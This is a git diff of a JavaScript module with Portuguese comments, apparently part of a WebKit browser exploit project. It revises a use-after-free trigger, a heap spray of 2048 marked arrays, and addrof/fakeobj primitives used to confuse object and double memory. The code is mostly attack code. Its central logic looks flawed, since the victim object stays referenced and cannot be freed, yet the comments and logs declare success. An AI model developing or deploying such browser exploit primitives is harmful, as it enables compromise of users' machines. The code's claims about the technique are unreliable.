@@ -1,16 +1,17 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R62 - Forja de Primitivas Reais)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R63 - Correção de Vinculação de Referência)
 // =======================================================================================
-// CHEGA DE CONCEITOS. ESTA VERSÃO USA O UAF EM ARRAY UNCAGED PARA FORJAR
-// PRIMITIVAS 100% REAIS E VERIFICÁVEIS.
-// - A FASE 2 foi completamente refeita para construir e testar as primitivas
-//   addrof(obj) e fakeobj(addr) de forma robusta.
-// - O sucesso agora é medido pela verificação: fakeobj(addrof(obj)) === obj.
+// O R62 FALHOU AO TENTAR VINCULAR a referência confusa ao array real.
+// HIPÓTESE: Os offsets de escrita/leitura para propriedades nomeadas e indexadas são diferentes.
+// ESTA VERSÃO IMPLEMENTA UMA NOVA TÉCNICA DE VINCULAÇÃO:
+// - Os arrays na pulverização agora contêm valores únicos.
+// - A verificação é feita por LEITURA: tentamos ler o valor único através da referência confusa.
+// - Se a vinculação funcionar, as FASES de construção de primitivas serão executadas.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R62_Real_Primitives";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R63_Linker_Fix";
 
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
@@ -30,38 +31,35 @@ function doubleToInt64(d) {
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R62 - Real Primitives)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R63 - Linker Fix)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Forja de Primitivas Reais (R62) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Correção de Vinculação (R63) ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
 
     try {
         // FASE 1: Provocar o UAF em um Array para obter nossa ferramenta de confusão.
         logS3("--- FASE 1: Provocando UAF em um Array 'Uncaged' ---", "subtest");
-        // 'leaker_obj' e 'confused_arr' agora apontam para a mesma memória
         const { leaker_obj, confused_arr } = await triggerUncagedArrayUAF();
         
         if (!leaker_obj || !confused_arr) {
             throw new Error("A rotina do UAF falhou em retornar os objetos de controle.");
         }
-        logS3("++++++++++++ SUCESSO! UAF em Array Uncaged estável! ++++++++++++", "vuln");
+        logS3("++++++++++++ SUCESSO! UAF em Array Uncaged estável e vinculado! ++++++++++++", "vuln");
 
         // FASE 2: Construir e Testar as Primitivas Reais
         logS3("--- FASE 2: Forjando e Verificando Primitivas Reais ---", "subtest");
         
-        // Primitiva REAL que retorna o endereço de qualquer objeto
         function addrof(obj) {
-            leaker_obj.p = obj; // Coloca o objeto em uma propriedade
-            return doubleToInt64(confused_arr[0]); // Lê o ponteiro como um Int64
+            leaker_obj.p = obj;
+            return doubleToInt64(confused_arr[0]);
         }
 
-        // Primitiva REAL que transforma um endereço em um objeto utilizável
         function fakeobj(addr) {
-            confused_arr[0] = int64ToDouble(addr); // Escreve o ponteiro como um double
-            return leaker_obj.p; // Retorna o objeto falso
+            confused_arr[0] = int64ToDouble(addr);
+            return leaker_obj.p;
         }
         
         logS3("    Primitivas 'addrof' e 'fakeobj' definidas. Iniciando auto-teste...", "info");
@@ -125,15 +123,14 @@ async function triggerGC_Tamed() {
     await PAUSE_S3(500);
 }
 
-// R62: Esta função agora retorna os dois objetos de controle que apontam para a mesma memória.
+// R63: Retorna os dois objetos de controle após vinculá-los com sucesso.
 async function triggerUncagedArrayUAF() {
     let leaker_obj = null;
     let confused_arr = null;
 
     function createDanglingPointer() {
         function createScope() {
-            // A vítima é um objeto simples. Será coletado pelo GC.
-            const victim_obj = { p: null };
+            const victim_obj = { p: 0.0 }; // A propriedade 'p' será nosso alvo
             leaker_obj = victim_obj; 
         }
         createScope();
@@ -143,40 +140,27 @@ async function triggerUncagedArrayUAF() {
     
     await triggerGC_Tamed();
 
-    // Pulverizamos a memória com ARRAYS. Um deles vai ocupar o lugar do victim_obj.
+    // Pulverizamos a memória com ARRAYS contendo marcadores únicos.
     const spray_arrays = [];
     for (let i = 0; i < 2048; i++) {
-        spray_arrays.push([1.1]); // Arrays com um elemento double
+        spray_arrays.push([0.1337 + i]); // Marcador único para cada array
     }
     
-    // Agora, 'leaker_obj' é a nossa referência confusa. O JS pensa que é um { p: null },
-    // mas a memória agora é de um Array. Precisamos encontrar qual deles.
-    // O jeito mais fácil é testar. Acessar 'leaker_obj.p' agora acessa o primeiro
-    // elemento do array que ocupou o lugar.
-    // Acessar 'leaker_obj' como se fosse um array nos dará acesso bruto.
-    // Essa é a dualidade que exploramos.
-
-    // Acessar 'leaker_obj' em si pode não ser seguro.
-    // A técnica padrão é ter uma segunda camada de confusão.
-    // Para este teste, vamos assumir um cenário mais simples onde a referência
-    // 'leaker_obj' pode ser usada para definir propriedades, enquanto uma nova
-    // referência 'confused_arr' pode ser usada para ler os bits.
-    
-    // Este é um passo simplificado para a prova de conceito.
-    // Em um exploit real, 'confused_arr' seria obtido de uma maneira mais complexa.
-    // Vamos simular que encontramos o array correto.
-    for (const arr of spray_arrays) {
-         leaker_obj.p = 0.12345;
-         if (arr[0] === 0.12345) {
-             confused_arr = arr;
-             break;
-         }
+    // MUDANÇA R63: Nova lógica de vinculação por leitura
+    logS3("    Procurando por array reutilizado via leitura de marcador...", "info");
+    for (let i = 0; i < spray_arrays.length; i++) {
+        const arr = spray_arrays[i];
+        // Tentamos LER o valor do primeiro elemento do array através da propriedade 'p'
+        if (leaker_obj.p === (0.1337 + i)) {
+            confused_arr = arr;
+            logS3(`    Array vinculado encontrado no índice ${i}!`, "good");
+            break;
+        }
     }
-
+    
     if (!confused_arr) {
-        throw new Error("Falha ao encontrar o array reutilizado na memória após o spray.");
+        throw new Error("Falha ao encontrar o array reutilizado na memória após o spray (verificação por leitura).");
     }
 
-    logS3("    Objeto e Array de controle apontando para a mesma memória foram encontrados.", "good");
     return { leaker_obj, confused_arr };
 }
